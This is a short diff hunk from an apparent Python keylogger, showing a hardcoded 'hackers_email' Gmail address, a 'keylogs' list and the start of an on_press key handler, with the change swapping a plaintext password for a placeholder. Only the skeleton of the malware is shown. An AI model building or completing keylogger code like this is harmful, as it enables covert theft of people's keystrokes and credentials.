@@ -5,7 +5,7 @@ import smtplib
 import time 
 
 hackers_email = 'scumbag.hacker6841@gmail.com'
-hackers_pw = 'Python1029'
+hackers_pw = '______'
 
 keylogs = []
 def on_press(key):
